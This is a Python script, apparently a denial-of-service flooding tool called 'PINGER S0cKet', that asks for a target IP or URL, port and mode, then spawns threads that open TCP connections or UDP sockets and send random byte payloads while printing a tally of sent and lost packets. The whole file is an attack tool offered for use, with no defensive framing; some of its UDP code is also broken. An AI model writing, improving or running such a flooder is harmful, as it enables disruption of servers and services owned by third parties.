import socket,requests,cloudscraper,threading,random,time,os,sys
from os import urandom as randbytes
try:
    os.system('cls')
except:
    os.system('clear')
lost_packet = 0
ok_packet = 0
ip_loader = ""
host = ""
def packet(ip,port,mode,size_packet,mode_packet):
    global lost_packet,ok_packet
    size = ""
    if mode_packet in "RANDBYTES":
        size = randbytes(int(size_packet))
    elif mode_packet in "URANDOM":
        size = random._urandom(int(size_packet))
    elif mode_packet in "MIX_SIZE":
        size = random._urandom(int(size_packet)) + randbytes(int(size_packet))
    try:
        if mode in "TCP_CLOSE":
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(size)
            s.close()
            ok_packet += 1
        elif mode in "TCP_KEEP":
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(size)
            ok_packet += 1
        elif mode in "MIX_TCP_KEEP":
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(size)
            s.connect_ex((ip,port))
            s.send(size)
            ok_packet += 1
        elif mode in "EX_TCP_CLOSE":
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect_ex((ip,port))
            s.send(size)
            s.close()
            ok_packet += 1
        elif mode in "MIX_TCP_CLOSE":
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect_ex((ip,port))
            s.send(size)
            s.close()
            s.connect((ip,port))
            s.send(size)
            s.close()
            ok_packet += 1
        elif mode in "EX_TCP_KEEP":
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect_ex((ip,port))
            s.send(size)
            ok_packet += 1
        elif mode in "UDP_CLOSE":
            s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            s.sendto(size)
            s.close
            ok_packet += 1
        elif mode in "UDP_KEEP":
            s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            s.sendto(size)
            ok_packet += 1
    except:
        lost_packet += 1

def packet2(ip,port,mode,size_packet,mode_packet):
    global lost_packet,ok_packet
    size = ""
    if mode_packet in "RANDBYTES":
        size = randbytes(int(size_packet))
    elif mode_packet in "URANDOM":
        size = random._urandom(int(size_packet))
    elif mode_packet in "MIX_SIZE":
        size = random._urandom(int(size_packet)) + randbytes(int(size_packet))
    try:
        if mode in "TCP_CLOSE":
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(size)
            s.close()
            ok_packet += 1
            lost_packet -= 1
        elif mode in "TCP_KEEP":
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(size)
            ok_packet += 1
            lost_packet -= 1
        elif mode in "MIX_TCP_KEEP":
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(size)
            s.connect_ex((ip,port))
            s.send(size)
            ok_packet += 1
            lost_packet -= 1
        elif mode in "EX_TCP_CLOSE":
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect_ex((ip,port))
            s.send(size)
            s.close()
            ok_packet += 1
            lost_packet -= 1
        elif mode in "MIX_TCP_CLOSE":
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect_ex((ip,port))
            s.send(size)
            s.close()
            s.connect((ip,port))
            s.send(size)
            s.close()
            ok_packet += 1
            lost_packet -= 1
        elif mode in "EX_TCP_KEEP":
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect_ex((ip,port))
            s.send(size)
            ok_packet += 1
            lost_packet -= 1
        elif mode in "UDP_CLOSE":
            s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            s.sendto(size)
            s.close
            ok_packet += 1
            lost_packet -= 1
        elif mode in "UDP_KEEP":
            s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            s.sendto(size)
            ok_packet += 1
            lost_packet -= 1
    except:
        ok_packet -= 1
        lost_packet += 1

print(f"""
╔═╗╦╔╗╔╔═╗╔═╗╦═╗
╠═╝║║║║║ ╦║╣ ╠╦╝
╩  ╩╝╚╝╚═╝╚═╝╩╚═ S0cKet

<-- MODE SENT PINGER SOCKET -->
  # UDP #             # TCP #
 UDP_CLOSE    EX_TCP_KEEP   TCP_KEEP
 UDP_KEEP     EX_TCP_CLOSE TCP_CLOSE
  # UDP #             # TCP #
          # MIX #
  MIX_TCP_CLOSE MIX_TCP_KEEP
          # MIX #
<-- MODE SENT PINGER SOCKET -->

<-- SIZE PACKET MODE -->
   (1) RANDBYTES   (2) URANDOM
   (3) MIX_SIZE
<-- SIZE PACKET MODE -->
""")

ip_loader_get = str(input("IP/URL-TARGET>"))
try:
    host = str(ip_loader_get).replace("https://", "").replace("http://", "").replace("www.", "")
    ip_loader = socket.gethostbyname(host)
except socket.gaierror:
    print (" ERROR\n Make sure you entered a correct website")
    sys.exit(2)
port_loader = int(input("PORT-TARGET>"))
mode = str(input("MODE SENT>"))
mode_packet = str(input("MODE PACKET SIZE>"))
size_packet = str(input("SIZE PACKET>"))
time_packet = int(input("TIME>"))
print(f"DELAY SENT 0-10")
delay = int(input("DELAY SENT>"))
print("OLD COUNT = 1 NEW COUNT = 2")
count_attack = int(input("MODE COUNT>"))

for runing in range(int(time_packet)):
    try:
        if count_attack == 1:
            threading.Thread(target=packet,args=(ip_loader,port_loader,mode,size_packet,mode_packet)).start()
        else:
            threading.Thread(target=packet2,args=(ip_loader,port_loader,mode,size_packet,mode_packet)).start()
        print(f"OK {ok_packet} LOST {lost_packet} RUN {runing} DELAY {delay} ---> {ip_loader}:{port_loader}")
        if delay == 0:
            pass
        else:
            time.sleep(delay)
    except KeyboardInterrupt:
        try:
            os.system('cls')
        except:
            os.system('clear')
        print(f"""
L0GS PINGER.s0cket

+-------------------------------[TARGET]
| IP {ip_loader} PORT {port_loader}
+----------------------[ STATUS PACKET ]
| OK PACKET   --> {ok_packet}
| LOST PACKET --> {lost_packet}
+------------------------------[ SETUP ]
| MODE SENT   --> {mode}
| MODE SIZE   --> {mode_packet}
| SIZE PACKET --> {size_packet}
| TYPE COUNT  --> {count_attack}
+-------------------------------[ TIME ]
| DELAY       --> {delay}
+---------------------------------------
""")
        sys.exit(1)
        exit(1)

try:
    os.system('cls')
except:
    os.system('clear')

print(f"""
L0GS PINGER.s0cket

+-------------------------------[TARGET]
| URL/IP {ip_loader} PORT {port_loader}
+----------------------[ STATUS PACKET ]
| OK PACKET   --> {ok_packet}
| LOST PACKET --> {lost_packet}
+------------------------------[ SETUP ]
| MODE SENT   --> {mode}
| MODE SIZE   --> {mode_packet}
| SIZE PACKET --> {size_packet}
| TYPE COUNT  --> {count_attack}
+-------------------------------[ TIME ]
| DELAY       --> {delay}
+-------------------------------------
""")
sys.exit(1)
exit(1)